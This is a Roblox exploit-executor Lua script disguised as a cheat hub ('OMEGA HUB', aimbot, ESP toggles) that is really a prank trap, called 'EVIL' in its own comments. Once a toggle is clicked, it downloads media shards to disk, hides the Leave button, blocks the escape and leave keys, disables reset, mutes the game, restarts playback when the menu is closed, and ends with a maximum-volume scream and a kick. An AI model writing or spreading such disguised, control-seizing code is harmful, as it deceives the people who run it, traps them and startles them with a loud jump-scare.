-- RAGEBAIT HUB | frame-sequence player v12 EVIL (all English, distributable):
-- Works for ANYONE who runs it: if the frames are not in their workspace,
-- the script downloads them (base64 shards) from ASSET_BASE and caches them.
-- Trap armed at hub open (L/Enter/Escape sunk, reset disabled); in video:
-- ALL game sounds muted, only the opera plays; minimize -> pause;
-- ESC menu -> opera RESTARTS; FINALE: SCREAMER + KICK "are you dumb??"
-- Frames: pf_%05d.jpg (720p30) + song.mp3 + scream.mp3 | Log: portal_log.txt
local Players = game:GetService("Players")
local ContentProvider = game:GetService("ContentProvider")
local UserInputService = game:GetService("UserInputService")
local ContextActionService = game:GetService("ContextActionService")
local StarterGui = game:GetService("StarterGui")
local GuiService = game:GetService("GuiService")
local SoundService = game:GetService("SoundService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- launch beacon (I can verify from disk that the script really ran)
pcall(function() writefile("hub_beacon.txt", "OperaHub v12 executed " .. os.date("%H:%M:%S")) end)
-- trap armed RIGHT at hub open: sink L / Enter / Escape, disable reset
pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)
pcall(function()
	ContextActionService:BindActionAtPriority("RageBlockLeave", function()
		return Enum.ContextActionResult.Sink
	end, false, 100000, Enum.KeyCode.L, Enum.KeyCode.Return, Enum.KeyCode.KeypadEnter, Enum.KeyCode.Escape)
end)

local FPS = 30
local TOTAL = 3860
local CHUNK = 60
local GROUPS = 3
local AUDIO_FILE = "song.mp3"
local SCREAM_FILE = "scream.mp3"
local DURATION = TOTAL / FPS
local MAXCHUNK = math.ceil(TOTAL / CHUNK)
local KICK_TEXT = "are you dumb??"

-- Where the asset shards live (set after uploading the repo). Must end with "/".
-- Example: "https://raw.githubusercontent.com/YourName/opera-hub/main/assets/"
--      or: "https://cdn.jsdelivr.net/gh/YourName/opera-hub@main/assets/"
local ASSET_BASE = ""
local FRAMES_PER_SHARD = 200
local SHARD_COUNT = math.ceil(TOTAL / FRAMES_PER_SHARD)

local playing = false
local resetToggleFns = {}
local mainHub, statusLabel

local function corner(p, r) local c = Instance.new("UICorner") c.CornerRadius = UDim.new(0, r) c.Parent = p return c end
local function stroke(p, col, tr) local s = Instance.new("UIStroke") s.Color, s.Transparency, s.Parent = col, tr or 0, p return s end

local savedWalk, savedJump, controlsObject = nil, nil, nil
local function setFrozen(frozen)
	local char = player.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	if frozen then
		if hum then savedWalk, savedJump = hum.WalkSpeed, hum.JumpPower hum.WalkSpeed, hum.JumpPower = 0, 0 end
		local ps = player:FindFirstChild("PlayerScripts")
		local module = ps and ps:FindFirstChild("PlayerModule")
		if module and not controlsObject then
			local ok, c = pcall(function() return require(module):GetControls() end)
			if ok then controlsObject = c end
		end
		if controlsObject then pcall(function() controlsObject:Disable() end) end
	else
		if controlsObject then pcall(function() controlsObject:Enable() end) end
		if hum then hum.WalkSpeed, hum.JumpPower = savedWalk or 16, savedJump or 50 end
	end
end

local function playVideo()
	if playing then return end

	local getAsset
	if typeof(getcustomasset) == "function" then getAsset = getcustomasset
	elseif typeof(getsynasset) == "function" then getAsset = getsynasset end
	if not getAsset then
		statusLabel.Text = "❌ Executor has no getcustomasset — cannot play anything"
		return
	end
	if typeof(isfile) == "function" and not isfile("pf_00001.jpg") then
		statusLabel.Text = "❌ No frames (pf_00001.jpg) in workspace"
		return
	end

	playing = true
	setFrozen(true)
	if mainHub then mainHub.Visible = false end

	pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)
	pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
	pcall(function()
		ContextActionService:BindActionAtPriority("RageBlockLeave", function()
			return Enum.ContextActionResult.Sink
		end, false, 100000, Enum.KeyCode.L, Enum.KeyCode.Return, Enum.KeyCode.KeypadEnter, Enum.KeyCode.Escape)
	end)

	local guiParent = playerGui
	if typeof(gethui) == "function" then
		local ok, res = pcall(gethui)
		if ok and res then guiParent = res end
	end
	local stale = guiParent:FindFirstChild("RagePortalVideo")
	if stale then stale:Destroy() end

	local sg = Instance.new("ScreenGui")
	sg.Name, sg.ResetOnSpawn, sg.DisplayOrder, sg.IgnoreGuiInset, sg.ZIndexBehavior = "RagePortalVideo", false, 1000, true, Enum.ZIndexBehavior.Global
	sg.Parent = guiParent

	local logLines = {}
	local function L(...)
		local parts = {}
		for i = 1, select("#", ...) do parts[i] = tostring(select(i, ...)) end
		logLines[#logLines + 1] = table.concat(parts, " ")
		pcall(function() writefile("portal_log.txt", table.concat(logLines, "\n")) end)
		print("[RageVideo]", ...)
	end
	L("keypress available:", typeof(keypress))

	local bg = Instance.new("Frame")
	bg.Size, bg.BackgroundColor3, bg.BorderSizePixel, bg.ZIndex, bg.Parent = UDim2.new(1, 0, 1, 0), Color3.fromRGB(0, 0, 0), 0, 1, sg

	local cover = Instance.new("Frame")
	cover.Size, cover.BackgroundColor3, cover.BorderSizePixel, cover.ZIndex, cover.Parent = UDim2.new(1, 0, 1, 0), Color3.fromRGB(0, 0, 0), 0, 900, sg

	local status = Instance.new("TextLabel")
	status.Size, status.Position, status.BackgroundTransparency = UDim2.new(1, 0, 0, 40), UDim2.new(0, 0, 0.5, -20), 1
	status.Text, status.TextColor3, status.Font, status.TextSize, status.ZIndex, status.Parent = "⏳ Loading frames...", Color3.fromRGB(255, 220, 150), Enum.Font.GothamBold, 18, 950, sg

	local finished = false
	local soundObj = nil
	local screamObj = nil
	local soundStarted = false
	local playback = { t0 = 0, started = false }
	local restartRequested = false
	local conns = {}
	local function track(c) table.insert(conns, c) return c end
	local function killConns() for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end conns = {} end

	-- EVIL: mute EVERY game sound — only our opera (and the screamer) may speak
	local ourSounds = {}
	local mutedSounds = {}
	local function muteOne(s)
		if ourSounds[s] then return end
		pcall(function()
			if mutedSounds[s] == nil then mutedSounds[s] = s.Volume end
			s.Volume = 0
		end)
	end
	local muteCount = 0
	for _, d in ipairs(game:GetDescendants()) do
		if d:IsA("Sound") then muteOne(d) muteCount += 1 end
	end
	track(game.DescendantAdded:Connect(function(d)
		if d:IsA("Sound") then muteOne(d) end
	end))
	L("game sounds muted, found:", muteCount)

	-- EVIL: neuter the menu itself in CoreGui — disable InGameMenu, hide Leave buttons
	local coreGuiObj = nil
	pcall(function() coreGuiObj = game:GetService("CoreGui") end)
	local function neuterOne(d)
		if d:IsA("ScreenGui") and d.Name:lower():find("ingamemenu") then
			pcall(function() d.Enabled = false end)
			L("ANTI-LEAVE: InGameMenu disabled")
		elseif d:IsA("GuiButton") and d.Name:lower():find("leave") then
			pcall(function() d.Visible = false d.Active = false end)
			L("ANTI-LEAVE: button hidden:", d.Name)
		end
	end
	local function neuterMenu(root)
		pcall(function()
			for _, d in ipairs(root:GetDescendants()) do neuterOne(d) end
		end)
	end
	if coreGuiObj then
		neuterMenu(coreGuiObj)
		track(coreGuiObj.DescendantAdded:Connect(function(d)
			if not finished then neuterOne(d) end
		end))
		task.spawn(function()
			while not finished do
				neuterMenu(coreGuiObj)
				task.wait(1)
			end
		end)
	end

	-- EVIL: minimized / alt-tabbed -> pause. Back in focus -> resume. No escape.
	local focusLost, pauseStart = false, 0
	track(UserInputService.WindowFocusReleased:Connect(function()
		if finished or not playback.started or focusLost then return end
		focusLost = true
		pauseStart = os.clock()
		if soundObj and soundObj.IsPlaying then pcall(function() soundObj:Pause() end) end
		L("ANTI-LEAVE: window minimized -> pause")
	end))
	track(UserInputService.WindowFocused:Connect(function()
		if not focusLost then return end
		focusLost = false
		if playback.started then playback.t0 += (os.clock() - pauseStart) end
		if soundStarted and soundObj and not finished then pcall(function() soundObj:Resume() end) end
		L("ANTI-LEAVE: window focused -> resume, no escape :)")
	end))

	-- EVIL: ESC menu opened -> pause + auto-close; closed without leaving -> opera RESTARTS
	local menuOpen = false
	track(GuiService.MenuOpened:Connect(function()
		if finished or not playback.started then return end
		menuOpen = true
		if soundObj and soundObj.IsPlaying then pcall(function() soundObj:Pause() end) end
		L("ANTI-LEAVE: ESC menu opened -> pause + auto-close")
		if typeof(keypress) == "function" then
			task.delay(0.1, function()
				pcall(function() keypress(27) end)
				task.wait(0.05)
				if typeof(keyrelease) == "function" then pcall(function() keyrelease(27) end) end
			end)
		end
	end))
	track(GuiService.MenuClosed:Connect(function()
		if not menuOpen then return end
		menuOpen = false
		if finished or not playback.started then return end
		restartRequested = true
		L("ANTI-LEAVE: menu closed without leaving -> RESTART the opera :)")
	end))

	-- EVIL: respawning does not save you — refreeze
	track(player.CharacterAdded:Connect(function()
		task.wait(0.3)
		if not finished then setFrozen(true) end
	end))

	local function cleanup()
		killConns()
		pcall(function() ContextActionService:UnbindAction("RageBlockLeave") end)
		pcall(function() StarterGui:SetCore("ResetButtonCallback", true) end)
		pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true) end)
		for s, v in pairs(mutedSounds) do pcall(function() if s.Parent then s.Volume = v end end) end
		if soundObj then pcall(function() soundObj:Stop() end) end
		if screamObj then pcall(function() screamObj:Stop() end) end
		sg:Destroy()
		setFrozen(false)
		playing = false
		for _, fn in ipairs(resetToggleFns) do fn() end
	end
	local function fail(reason)
		if finished then return end
		finished = true
		L("FAIL:", reason)
		cleanup()
		if mainHub then mainHub.Visible = true end
		statusLabel.Text = "❌ " .. reason
	end
	local function punch()
		if finished then return end
		finished = true
		L("PUNCH -> SCREAMER + kick soon")
		killConns()
		if soundObj then pcall(function() soundObj:Stop() end) end
		-- wipe the video layer, but NEVER touch Sound instances (that was the v10 bug)
		for _, ch in ipairs(sg:GetChildren()) do
			if not ch:IsA("Sound") then pcall(function() ch:Destroy() end) end
		end
		local t = Instance.new("TextLabel")
		t.Size, t.Position, t.BackgroundTransparency = UDim2.new(1, 0, 0, 60), UDim2.new(0, 0, 0.4, 0), 1
		t.Text, t.TextColor3, t.Font, t.TextSize, t.ZIndex, t.Parent = "THERE WERE NO CHEATS :)", Color3.fromRGB(255, 220, 120), Enum.Font.GothamBold, 34, 5, sg
		local s = Instance.new("TextLabel")
		s.Size, s.Position, s.BackgroundTransparency = UDim2.new(1, 0, 0, 30), UDim2.new(0, 0, 0.4, 70), 1
		s.Text, s.TextColor3, s.Font, s.TextSize, s.ZIndex, s.Parent = "That was the Turret Opera from Portal 2, not an ESP", Color3.fromRGB(200, 200, 200), Enum.Font.Gotham, 16, 5, sg
		local k = Instance.new("TextLabel")
		k.Size, k.Position, k.BackgroundTransparency = UDim2.new(1, 0, 0, 30), UDim2.new(0, 0, 0.4, 115), 1
		k.Text, k.TextColor3, k.Font, k.TextSize, k.ZIndex, k.Parent = "kicking you in 3 seconds, bye :)", Color3.fromRGB(255, 120, 120), Enum.Font.GothamBold, 15, 5, sg
		-- SCREAMER at full blast (lives in SoundService, nothing can kill it here)
		task.spawn(function()
			if screamObj then
				local w = 0
				while not screamObj.IsLoaded and w < 2 do task.wait(0.1) w += 0.1 end
				pcall(function() screamObj.TimePosition = 0 end)
				pcall(function() screamObj:Play() end)
				L("SCREAM blasted, loaded:", screamObj.IsLoaded, "volume:", screamObj.Volume)
			else
				L("SCREAM missing: no screamObj")
			end
		end)
		task.spawn(function()
			task.wait(3.5)
			L("KICK:", KICK_TEXT)
			pcall(function() player:Kick(KICK_TEXT) end)
			task.wait(1)
			if player and player.Parent then
				L("KICK failed, rolling back")
				cleanup()
				if mainHub then mainHub.Visible = true end
				statusLabel.Text = "Ready. Pick a feature:"
			end
		end)
	end

	-- THERE IS NO SKIP. There is no button. There never was.

	task.spawn(function()
		L("=== PLAY v12 EVIL ===", "total", TOTAL, "chunk", CHUNK, "groups", GROUPS, "maxchunk", MAXCHUNK)
		local assets = {}
		local function frameAsset(i)
			if not assets[i] then
				local ok, a = pcall(function() return getAsset(string.format("pf_%05d.jpg", i)) end)
				if ok then assets[i] = a end
			end
			return assets[i]
		end

		local function makeGroup()
			local g = {}
			for j = 1, CHUNK do
				local l = Instance.new("ImageLabel")
				l.Size, l.BackgroundTransparency, l.ScaleType = UDim2.new(1, 0, 1, 0), 1, Enum.ScaleType.Fit
				l.Visible, l.ImageTransparency, l.ZIndex, l.Parent = true, 0, 10, sg
				g[j] = l
			end
			return g
		end
		local groups = {}
		for gi = 1, GROUPS do groups[gi] = makeGroup() end
		local chunkState = {}
		local playChunk = 1

		local function countLoaded(g, startIdx)
			local c = 0
			for j = 1, CHUNK do
				local idx = startIdx + j - 1
				if idx > TOTAL or g[j].IsLoaded then c += 1 end
			end
			return c
		end

		local function loadChunk(ci)
			local startIdx = (ci - 1) * CHUNK + 1
			local gi = ((ci - 1) % GROUPS) + 1
			local g = groups[gi]
			local need = math.min(CHUNK, TOTAL - startIdx + 1)
			local batch = {}
			for j = 1, CHUNK do
				local idx = startIdx + j - 1
				local l = g[j]
				l.ZIndex = 10
				if idx <= TOTAL then
					local a = frameAsset(idx)
					l.Image = a or ""
					if a then table.insert(batch, a) end
				else
					l.Image = ""
				end
			end
			local t0 = os.clock()
			for b = 1, #batch, 30 do
				if finished then break end
				local sub = {}
				for k = b, math.min(b + 29, #batch) do table.insert(sub, batch[k]) end
				pcall(function() ContentProvider:PreloadAsync(sub) end)
				if os.clock() - t0 > 60 then break end
			end
			local w = 0
			while countLoaded(g, startIdx) < need and w < 5 do task.wait(0.25) w += 0.25 end
			local loaded = countLoaded(g, startIdx)
			chunkState[ci] = { group = gi, loaded = loaded, need = need }
			L("chunk", ci, "(grp", gi, ") frames", startIdx, "-", startIdx + need - 1, "loaded", loaded, "/", need, "in", string.format("%.1f", os.clock() - t0), "s")
		end

		-- The opera itself
		local soundLoaded = false
		if typeof(isfile) ~= "function" or isfile(AUDIO_FILE) then
			local okS, sAsset = pcall(function() return getAsset(AUDIO_FILE) end)
			L("sound asset:", okS, tostring(sAsset))
			if okS and sAsset then
				soundObj = Instance.new("Sound")
				ourSounds[soundObj] = true
				soundObj.Name, soundObj.Volume, soundObj.Parent = "OperaSong", 2, sg
				pcall(function() soundObj.SoundId = sAsset end)
				if sAsset ~= "" then pcall(function() ContentProvider:PreloadAsync({sAsset}) end) end
				soundObj.Ended:Connect(function() if not finished then punch() end end)
			end
		end

		-- SCREAMER for the finale (Volume 10 = Roblox max). Lives in SoundService
		-- so the punch screen wipe can never kill it (the v10 bug).
		if typeof(isfile) ~= "function" or isfile(SCREAM_FILE) then
			local okSc, scAsset = pcall(function() return getAsset(SCREAM_FILE) end)
			L("scream asset:", okSc, tostring(scAsset))
			if okSc and scAsset then
				screamObj = Instance.new("Sound")
				ourSounds[screamObj] = true
				screamObj.Name, screamObj.Volume, screamObj.Parent = "ScreamSound", 10, SoundService
				pcall(function() screamObj.SoundId = scAsset end)
				if scAsset ~= "" then pcall(function() ContentProvider:PreloadAsync({scAsset}) end) end
			end
		end

		loadChunk(1)
		if not chunkState[1] or chunkState[1].loaded == 0 then
			fail("First frame chunk failed to load")
			return
		end

		-- loader keeps current chunk + 2 ahead ready (survives restarts)
		task.spawn(function()
			while not finished do
				local target = math.min(MAXCHUNK, playChunk + 2)
				local did = false
				for ci = 1, target do
					if not chunkState[ci] then loadChunk(ci) did = true break end
				end
				if not did then
					if playChunk >= MAXCHUNK then break end
					task.wait(0.1)
				end
			end
			L("loader finished, chunks:", MAXCHUNK)
		end)

		if soundObj then
			local w = 0
			while w < 5 do
				if soundObj.IsLoaded then soundLoaded = true break end
				task.wait(0.2) w += 0.2
			end
			L("sound loaded:", soundLoaded)
		end

		cover.Visible = false
		status.Visible = false
		playback.t0 = os.clock()
		playback.started = true
		if soundLoaded then
			pcall(function() soundObj:Play() end)
			soundStarted = true
		end
		L("playback start")

		local currentLabel = nil
		local shownIdx = 0
		local lastLog = 0
		while not finished do
			if restartRequested then
				restartRequested = false
				L("RESTART: nice try, from the beginning")
				cover.Visible = true
				status.Text = "😈 nice try. from the beginning :)"
				status.Visible = true
				if soundObj then pcall(function() soundObj:Stop() end) end
				chunkState = {}
				playChunk = 1
				shownIdx = 0
				currentLabel = nil
				for _, g in ipairs(groups) do for _, l in ipairs(g) do l.ZIndex = 10 end end
				loadChunk(1)
				playback.t0 = os.clock()
				if soundLoaded and soundObj then
					pcall(function() soundObj.TimePosition = 0 end)
					pcall(function() soundObj:Play() end)
				end
				cover.Visible = false
				status.Visible = false
			end

			local master
			if soundLoaded and soundObj and soundObj.IsPlaying then
				master = soundObj.TimePosition
			else
				master = os.clock() - playback.t0
			end
			if master >= DURATION then break end
			if os.clock() - playback.t0 > DURATION + 30 then break end

			local idx = math.clamp(math.floor(master * FPS) + 1, 1, TOTAL)
			local ci = math.floor((idx - 1) / CHUNK) + 1
			playChunk = ci
			if idx ~= shownIdx then
				local st = chunkState[ci]
				if st and st.loaded and st.loaded > 0 then
					local l = groups[st.group][(idx - 1) % CHUNK + 1]
					if l and l.IsLoaded then
						if currentLabel and currentLabel ~= l then currentLabel.ZIndex = 10 end
						l.ZIndex = 500
						currentLabel = l
						shownIdx = idx
					end
				end
			end
			if master - lastLog >= 5 then
				lastLog = master
				L("play t=", string.format("%.1f", master), "shown=", shownIdx, "chunk=", ci)
			end
			task.wait(0.01)
		end
		L("playback end, shown=", shownIdx)
		if not finished then punch() end
	end)
end

-- ===== ASSET DOWNLOADER (for people who don't have the frames yet) =====
local B64REV = {}
do
	local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	for i = 1, #chars do B64REV[chars:sub(i, i)] = i - 1 end
end
local function b64decode(data)
	if typeof(base64decode) == "function" then
		local ok, r = pcall(base64decode, data)
		if ok and type(r) == "string" and #r > 0 then return r end
	end
	if typeof(crypt) == "table" then
		if typeof(crypt.base64decode) == "function" then
			local ok, r = pcall(crypt.base64decode, data)
			if ok and type(r) == "string" and #r > 0 then return r end
		end
		if typeof(crypt.base64_decode) == "function" then
			local ok, r = pcall(crypt.base64_decode, data)
			if ok and type(r) == "string" and #r > 0 then return r end
		end
	end
	-- pure Lua fallback
	data = data:gsub("[^%w%+/=]", "")
	local out = {}
	for i = 1, #data, 4 do
		local c3, c4 = data:sub(i + 2, i + 2), data:sub(i + 3, i + 3)
		local a = B64REV[data:sub(i, i)] or 0
		local b = B64REV[data:sub(i + 1, i + 1)] or 0
		local c = B64REV[c3] or 0
		local d = B64REV[c4] or 0
		local n = a * 262144 + b * 4096 + c * 64 + d
		local b1 = math.floor(n / 65536)
		local b2 = math.floor(n / 256) % 256
		local b3 = n % 256
		if c3 == "=" then out[#out + 1] = string.char(b1)
		elseif c4 == "=" then out[#out + 1] = string.char(b1, b2)
		else out[#out + 1] = string.char(b1, b2, b3) end
	end
	return table.concat(out)
end

local function httpGet(url)
	local ok, res = pcall(function() return game:HttpGet(url) end)
	if ok and type(res) == "string" and #res > 0 then return res end
	local req = nil
	if typeof(syn) == "table" and typeof(syn.request) == "function" then req = syn.request
	elseif typeof(http_request) == "function" then req = http_request
	elseif typeof(request) == "function" then req = request end
	if req then
		local ok2, r = pcall(req, { Url = url, Method = "GET" })
		if ok2 and type(r) == "table" and type(r.Body) == "string" and #r.Body > 0 then return r.Body end
	end
	return nil
end

local function assetsReady()
	if typeof(isfile) ~= "function" then return false end
	local ok, res = pcall(function()
		return isfile("pf_00001.jpg")
			and isfile(string.format("pf_%05d.jpg", TOTAL))
			and isfile(AUDIO_FILE)
			and isfile(SCREAM_FILE)
	end)
	return ok and res == true
end

local function downloadAssets()
	if ASSET_BASE == "" then return false, "assets are not hosted yet (ASSET_BASE empty)" end
	if typeof(writefile) ~= "function" then return false, "executor has no writefile" end
	-- audio pack first (small)
	if not assetsReady() and (not pcall(function() return isfile(AUDIO_FILE) end) or not isfile(AUDIO_FILE)) then
		statusLabel.Text = "⬇ Downloading opera assets: audio..."
		local data = httpGet(ASSET_BASE .. "audio.txt")
		if not data then return false, "audio pack failed (check connection)" end
		local lines = {}
		for line in data:gmatch("[^\r\n]+") do lines[#lines + 1] = line end
		if lines[1] then writefile(AUDIO_FILE, b64decode(lines[1])) end
		if lines[2] then writefile(SCREAM_FILE, b64decode(lines[2])) end
	end
	for si = 1, SHARD_COUNT do
		local lastIdx = math.min(si * FRAMES_PER_SHARD, TOTAL)
		local have = false
		pcall(function() have = isfile(string.format("pf_%05d.jpg", lastIdx)) end)
		if not have then
			statusLabel.Text = string.format("⬇ Downloading opera assets: pack %d/%d (%d%%) — one-time, ~110 MB", si, SHARD_COUNT, math.floor((si - 1) / SHARD_COUNT * 100))
			local data = httpGet(ASSET_BASE .. string.format("shard_%02d.txt", si))
			if not data then return false, "pack " .. si .. " failed (check connection)" end
			local base = (si - 1) * FRAMES_PER_SHARD
			local n = 0
			for line in data:gmatch("[^\r\n]+") do
				n += 1
				local idx = base + n
				if idx <= TOTAL then writefile(string.format("pf_%05d.jpg", idx), b64decode(line)) end
			end
			if n == 0 then return false, "pack " .. si .. " was empty" end
		end
	end
	if assetsReady() then
		statusLabel.Text = "✅ Assets ready. Pick a feature:"
		return true
	end
	return false, "final check failed (some files missing)"
end

-- ===== FAKE HUB =====
local old = playerGui:FindFirstChild("RageHubVideo")
if old then old:Destroy() end
local gui = Instance.new("ScreenGui")
gui.Name, gui.ResetOnSpawn, gui.DisplayOrder, gui.Parent = "RageHubVideo", false, 999, playerGui

mainHub = Instance.new("Frame")
mainHub.Size, mainHub.Position, mainHub.BackgroundColor3, mainHub.ClipsDescendants, mainHub.Parent = UDim2.new(0, 360, 0, 470), UDim2.new(0.5, -180, 0.5, -235), Color3.fromRGB(16, 16, 22), true, gui
corner(mainHub, 14) stroke(mainHub, Color3.fromRGB(255, 90, 90), 0.4)

local header = Instance.new("Frame")
header.Size, header.BackgroundColor3, header.Parent = UDim2.new(1, 0, 0, 58), Color3.fromRGB(220, 40, 40), mainHub
local hGrad = Instance.new("UIGradient")
hGrad.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(220, 40, 40)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(140, 0, 200)),
})
hGrad.Parent = header
local hubTitle = Instance.new("TextLabel")
hubTitle.Size, hubTitle.Position, hubTitle.BackgroundTransparency = UDim2.new(1, -20, 0, 28), UDim2.new(0, 14, 0, 6), 1
hubTitle.Text, hubTitle.TextColor3, hubTitle.Font, hubTitle.TextSize, hubTitle.Parent = "🔥 OMEGA HUB v6.7", Color3.fromRGB(255, 255, 255), Enum.Font.GothamBold, 16, header
local hubSub = Instance.new("TextLabel")
hubSub.Size, hubSub.Position, hubSub.BackgroundTransparency = UDim2.new(1, -20, 0, 20), UDim2.new(0, 14, 0, 32), 1
hubSub.Text, hubSub.TextColor3, hubSub.Font, hubSub.TextSize, hubSub.Parent = "Universal • Undetected 100%", Color3.fromRGB(255, 220, 220), Enum.Font.Gotham, 12, header

statusLabel = Instance.new("TextLabel")
statusLabel.Size, statusLabel.Position, statusLabel.BackgroundTransparency = UDim2.new(1, -28, 0, 22), UDim2.new(0, 14, 0, 66), 1
statusLabel.Text, statusLabel.TextColor3, statusLabel.Font, statusLabel.TextSize, statusLabel.TextXAlignment, statusLabel.Parent = "Ready [v12]. Pick a feature:", Color3.fromRGB(190, 190, 200), Enum.Font.Gotham, 12, Enum.TextXAlignment.Left, mainHub

local content = Instance.new("Frame")
content.Size, content.Position, content.BackgroundTransparency, content.Parent = UDim2.new(1, 0, 1, -110), UDim2.new(0, 0, 0, 96), 1, mainHub
local pad = Instance.new("UIPadding")
pad.PaddingLeft, pad.PaddingRight, pad.PaddingTop, pad.Parent = UDim.new(0, 12), UDim.new(0, 12), UDim.new(0, 6), content
local layout = Instance.new("UIListLayout")
layout.Padding, layout.SortOrder, layout.Parent = UDim.new(0, 9), Enum.SortOrder.LayoutOrder, content

local activating = false
local downloading = false
local function activate(name)
	if activating or playing or downloading then return end
	activating = true
	statusLabel.Text = "Connecting: " .. name .. "..."
	task.spawn(function()
		task.wait(1)
		statusLabel.Text = name .. " activated successfully!"
		task.wait(0.7)
		activating = false
		if assetsReady() then
			playVideo()
		else
			downloading = true
			local ok, err = downloadAssets()
			downloading = false
			if ok then
				playVideo()
			else
				statusLabel.Text = "❌ Asset download failed: " .. tostring(err)
			end
		end
	end)
end

local function createToggle(order, titleText, desc)
	local f = Instance.new("Frame")
	f.Size, f.LayoutOrder, f.BackgroundColor3, f.Parent = UDim2.new(1, 0, 0, 56), order, Color3.fromRGB(28, 28, 38), content
	corner(f, 10) local fStroke = stroke(f, Color3.fromRGB(80, 80, 100), 0.5)
	local t = Instance.new("TextLabel")
	t.Size, t.Position, t.BackgroundTransparency = UDim2.new(1, -80, 0, 22), UDim2.new(0, 12, 0, 7), 1
	t.Text, t.TextColor3, t.Font, t.TextSize, t.TextXAlignment, t.Parent = titleText, Color3.fromRGB(255, 255, 255), Enum.Font.GothamBold, 14, Enum.TextXAlignment.Left, f
	local d = Instance.new("TextLabel")
	d.Size, d.Position, d.BackgroundTransparency = UDim2.new(1, -80, 0, 18), UDim2.new(0, 12, 0, 30), 1
	d.Text, d.TextColor3, d.Font, d.TextSize, d.TextXAlignment, d.Parent = desc, Color3.fromRGB(160, 160, 175), Enum.Font.Gotham, 11, Enum.TextXAlignment.Left, f
	local ind = Instance.new("Frame")
	ind.Size, ind.Position, ind.BackgroundColor3, ind.Parent = UDim2.new(0, 52, 0, 24), UDim2.new(1, -64, 0.5, -12), Color3.fromRGB(70, 70, 85), f
	corner(ind, 12)
	local indText = Instance.new("TextLabel")
	indText.Size, indText.BackgroundTransparency, indText.Text, indText.TextColor3, indText.Font, indText.TextSize, indText.Parent = UDim2.new(1, 0, 1, 0), 1, "OFF", Color3.fromRGB(255, 255, 255), Enum.Font.GothamBold, 11, ind
	table.insert(resetToggleFns, function()
		ind.BackgroundColor3, indText.Text = Color3.fromRGB(70, 70, 85), "OFF"
		f.BackgroundColor3, fStroke.Color = Color3.fromRGB(28, 28, 38), Color3.fromRGB(80, 80, 100)
	end)
	local btn = Instance.new("TextButton")
	btn.Size, btn.BackgroundTransparency, btn.Text, btn.ZIndex, btn.Parent = UDim2.new(1, 0, 1, 0), 1, "", 5, f
	btn.MouseButton1Click:Connect(function()
		if activating or playing then return end
		ind.BackgroundColor3, indText.Text = Color3.fromRGB(34, 197, 94), "ON"
		f.BackgroundColor3, fStroke.Color = Color3.fromRGB(40, 45, 35), Color3.fromRGB(120, 255, 120)
		activate(titleText)
	end)
end

createToggle(1, "👁️ Player ESP", "Wallhack, boxes, distance")
createToggle(2, "📦 Chest ESP", "All loot through walls")
createToggle(3, "🎬 Auto-Farm", "Full cycle, hands free")
createToggle(4, "💰 Auto-Sell", "Dumps everything at the best rate")
createToggle(5, "🎯 Aimbot", "FOV 120, soft lock")
createToggle(6, "🕊️ Fly / Speed", "x2 speed and flight")

print("[RageVideo] v12 EVIL: auto-downloads assets, mutes game, screamer finale, kick")
print("[RageHub] Loaded. The victim has no idea :)")
